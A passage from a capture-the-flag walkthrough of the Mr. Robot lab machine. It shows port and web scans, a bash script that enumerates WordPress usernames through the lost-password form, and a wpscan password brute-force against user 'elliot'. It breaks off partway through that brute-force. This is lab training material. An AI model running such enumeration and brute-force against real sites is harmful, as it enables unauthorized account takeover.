<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="https://wpscan.org/">wpscan</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.137  00:0c:29:61:51:fa   VMware, Inc.
</span><span class='line'>10.1.1.254  00:50:56:f3:e7:2a   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 3.021 seconds <span class="o">(</span>84.74 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.137</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.137/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-08-05 12:37:00 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.137                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 443/tcp on 10.1.1.137                    &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.137
</span><span class='line'>Host is up <span class="o">(</span>0.0037s latency<span class="o">)</span>.
</span><span class='line'>PORT    STATE SERVICE  VERSION
</span><span class='line'>80/tcp  open  http     Apache httpd
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'>443/tcp open  ssl/http Apache httpd
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
</span><span class='line'><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.example.com
</span><span class='line'><span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>www.example.com
</span><span class='line'><span class="p">|</span> Public Key <span class="nb">type</span>: rsa
</span><span class='line'><span class="p">|</span> Public Key bits: 1024
</span><span class='line'><span class="p">|</span> Signature Algorithm: sha1WithRSAEncryption
</span><span class='line'><span class="p">|</span> Not valid before: 2015-09-16T10:45:03
</span><span class='line'><span class="p">|</span> Not valid after:  2025-09-13T10:45:03
</span><span class='line'><span class="p">|</span> MD5:   3c16 3b19 87c3 42ad <span class="m">6634</span> c1c9 d0aa fb97
</span><span class='line'><span class="p">|</span>_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
</span><span class='line'>MAC Address: 00:0C:29:61:51:FA <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X<span class="p">|</span>4.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
</span><span class='line'>OS details: Linux 3.10 - 3.19, Linux 3.2 - 4.0
</span><span class='line'>Uptime guess: 0.000 days <span class="o">(</span>since Fri Aug  <span class="m">5</span> 08:38:08 2016<span class="o">)</span>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span>truncated<span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Only port <code>80</code> and <code>443</code> is found and <code>Apache</code> is the HTTP server.</p>

<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities in terms of port <code>80</code> found by port-scanning stage.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>- Nikto v2.1.6/2.1.5
</span><span class='line'>+ Target Host: 10.1.1.137
</span><span class='line'>+ Target Port: 80
</span><span class='line'>+ GET The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ GET The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
</span><span class='line'>+ GET Retrieved x-powered-by header: PHP/5.5.29
</span><span class='line'>+ GET Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>tcn<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: list
</span><span class='line'>+ GET Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.wisec.it/sectou.php?id=4698ebdc59d15.&quot;</span>&gt;http://www.wisec.it/sectou.php?id<span class="o">=</span>4698ebdc59d15.&lt;/a&gt; The following alternatives <span class="k">for</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>index<span class="p">&amp;</span>rsquo<span class="p">;</span> were found: index.html, index.php
</span><span class='line'>+ OSVDB-3092: GET /admin/: This might be interesting<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>+ GET Uncommon header <span class="p">&amp;</span>lsquo<span class="p">;</span>link<span class="p">&amp;</span>rsquo<span class="p">;</span> found, with contents: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/?p=23&quot;</span>&gt;http://10.1.1.137/?p<span class="o">=</span>23&lt;/a&gt;<span class="p">;</span> <span class="nv">rel</span><span class="o">=</span>shortlink
</span><span class='line'>+ GET /readme.html: This WordPress file reveals the installed version.
</span><span class='line'>+ GET /wp-links-opml.php: This WordPress script reveals the installed version.
</span><span class='line'>+ OSVDB-3092: GET /license.txt: License file found may identify site software.
</span><span class='line'>+ GET /admin/index.html: Admin login page/section found.
</span><span class='line'>+ GET Cookie wordpress_test_cookie created without the httponly flag
</span><span class='line'>+ GET /wp-login/: Admin login page/section found.
</span><span class='line'>+ GET /wordpress/: A Wordpress installation was found.
</span><span class='line'>+ GET /wp-admin/wp-login.php: Wordpress login found
</span><span class='line'>+ GET /blog/wp-login.php: Wordpress login found
</span><span class='line'>+ GET /wp-login.php: Wordpress login found
</span></code></pre></td></tr></table></div></figure></p>

<p><code>WordPress CMS</code> is found, also <code>/robots.txt</code> and <code>/license.txt</code> are found.</p>

<p>So I run <code>wpscan</code> to scan this WordPress CMS, and in the mean time, I go have a look at the two interesting files.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# wpscan <span class="p">&amp;</span>ndash<span class="p">;</span>url 10.1.1.137&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    __          _______   _____
</span><span class='line'>    <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span><span class='line'>     <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
</span><span class='line'>      <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>
</span><span class='line'>       <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>        <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>    WordPress Security Scanner by the WPScan Team
</span><span class='line'>                   Version 2.8
</span><span class='line'>      Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   @&lt;em&gt;WPScan&lt;/em&gt;, @ethicalhack3r, @erwan_lr, pvdl, @&lt;em&gt;FireFart&lt;/em&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>i<span class="o">]</span> It seems like you have not updated the database <span class="k">for</span> some time.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/&quot;</span>&gt;http://10.1.1.137/&lt;/a&gt;
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Started: Fri Aug  <span class="m">5</span> 23:16:00 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> robots.txt available under: <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/robots.txt&quot;</span>&gt;http://10.1.1.137/robots.txt&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span>
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> The WordPress <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/readme.html&quot;</span>&gt;http://10.1.1.137/readme.html&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> file exists exposing a version number
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: SERVER: Apache
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: X-MOD-PAGESPEED: 1.9.32.3-4523
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> XML-RPC Interface available under: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/xmlrpc.php&quot;</span>&gt;http://10.1.1.137/xmlrpc.php&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> WordPress version 4.3.5 identified from rss generator&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Enumerating plugins from passive detection <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> No plugins found&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Finished: Fri Aug  <span class="m">5</span> 23:16:01 2016
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Requests Done: 48
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Memory used: 7.668 MB
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Elapsed <span class="nb">time</span>: 00:00:00
</span></code></pre></td></tr></table></div></figure></p>

<p>From the <code>wpscan</code> result, there is nothing special information. But from the robot file <code>/robots.txt</code>, I got the 1st flag!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>User-agent: *
</span><span class='line'>fsocity.dic
</span><span class='line'>key-1-of-3.txt
</span></code></pre></td></tr></table></div></figure></p>

<p>The first key found in the file <code>key-1-of-3.txt</code>: <font color='red'><code>073403c8a58a1f80d943455fb30724b9</code></font></p>

<p>And I got a dictionary file <code>fsocity.dic</code> as well.</p>

<p>Highly believed that I can brute force username / password by using this dictionary file, and I filtered it to include the strings which only between 4-8 digitals.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# grep -E <span class="p">&amp;</span>lsquo<span class="p">;</span>^<span class="o">[</span>a-zA-Z<span class="o">]</span><span class="p">&amp;</span>rsquo<span class="p">;</span> fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span>  awk <span class="p">&amp;</span>lsquo<span class="p">;</span>length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span><span class="m">8</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> &gt;<span class="o">=</span> <span class="m">4</span> <span class="o">{</span> print <span class="nv">$1</span><span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; users.txt
</span><span class='line'>root@kali:~/mrRobot# ls -l
</span><span class='line'>total 7124
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root    <span class="m">1546</span> Aug  <span class="m">5</span> 08:48 10.1.1.137_nikto.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root    <span class="m">1845</span> Aug  <span class="m">5</span> 08:38 10.1.1.137_nmap.txt
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root <span class="m">7245381</span> Aug  <span class="m">5</span> 23:49 fsociety.dic
</span><span class='line'>-rw-r<span class="p">&amp;</span>ndash<span class="p">;</span>r<span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> root root   <span class="m">37007</span> Aug  <span class="m">7</span> 04:06 users.txt
</span><span class='line'>root@kali:~/mrRobot# wc -l users.txt
</span><span class='line'><span class="m">5247</span> users.txt
</span></code></pre></td></tr></table></div></figure></p>

<p>In order to brute force wordpress username, I could not find any tool on the Internet, so I write a simple script <code>enum_wp_users.sh</code> to do it.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;!/bin/bash&lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;function usage<span class="o">(){</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">### wordpress username enumerator v0.1&amp;rdquo;</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">### by using wordpress&#39; lostpassword function.&amp;rdquo;</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>USAGE: <span class="nv">$0</span> &lt;base-url&gt; &lt;wordlist&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;function main<span class="o">(){</span>
</span><span class='line'>    <span class="nb">local </span><span class="nv">base_url</span><span class="o">=</span><span class="nv">$1</span>
</span><span class='line'>    <span class="nb">local </span><span class="nv">wordlist</span><span class="o">=</span><span class="nv">$2</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;for word in <span class="k">$(</span>cat <span class="s2">&quot;$wordlist&quot;</span><span class="k">)</span><span class="p">;</span> <span class="k">do</span>
</span><span class='line'>    <span class="k">if</span> ! curl -s --data <span class="s2">&quot;user_login=${word}&amp;amp;redirect_to=&amp;amp;wp-submit=Get+New+Password&quot;</span> <span class="s2">&quot;http://${base_url}/wp-login.php?action=lostpassword&quot;</span> <span class="p">|</span> grep -q ERROR<span class="p">;</span> <span class="k">then</span>
</span><span class='line'>        <span class="nb">echo</span> <span class="s2">&quot;Found valid username: ${word}&quot;</span>
</span><span class='line'>    <span class="k">fi</span>
</span><span class='line'><span class="k">done</span>
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">}</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;if <span class="o">[</span> -z <span class="nv">$2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
</span><span class='line'>    usage
</span><span class='line'><span class="k">else</span>
</span><span class='line'>    main <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="nv">$@</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'><span class="k">fi</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>By using this script with filtered dictionary file <code>users.txt</code>, I found one valid username <code>elliot</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# ./enum_wp_users.sh 10.1.1.137 users.txt
</span><span class='line'>Found valid username: elliot
</span><span class='line'>Found valid username: Elliot
</span><span class='line'>Found valid username: ELLIOT
</span></code></pre></td></tr></table></div></figure></p>

<p>Then using wpscan to brute force password for the user <code>elliot</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/mrRobot# cat fsociety.dic <span class="p">|</span> sort -u <span class="p">|</span> awk <span class="p">&amp;</span>lsquo<span class="p">;</span>length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span> <span class="m">16</span> <span class="p">&amp;</span>amp<span class="p">;&amp;</span>amp<span class="p">;</span> length<span class="o">(</span><span class="nv">$1</span><span class="o">)</span> &gt;<span class="o">=</span> <span class="m">6</span> <span class="o">{</span> print <span class="nv">$1</span> <span class="o">}</span><span class="p">&amp;</span>rsquo<span class="p">;</span> &gt; pass.txt
</span><span class='line'>root@kali:~/mrRobot# wpscan <span class="p">&amp;</span>ndash<span class="p">;</span>url 10.1.1.137 <span class="p">&amp;</span>ndash<span class="p">;</span>wordlist ~/mrRobot/pass.txt <span class="p">&amp;</span>ndash<span class="p">;</span>username elliot&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    __          _______   _____
</span><span class='line'>    <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span><span class='line'>     <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __
</span><span class='line'>      <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>
</span><span class='line'>       <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>        <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>    WordPress Security Scanner by the WPScan Team
</span><span class='line'>                   Version 2.8
</span><span class='line'>      Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   @&lt;em&gt;WPScan&lt;/em&gt;, @ethicalhack3r, @erwan_lr, pvdl, @&lt;em&gt;FireFart&lt;/em&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.137/&quot;</span>&gt;http://10.1.1.137/&lt;/a&gt;
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Started: Mon Aug  <span class="m">8</span> 03:09:23 2016&lt;/p&gt;
</span><span class='line'>
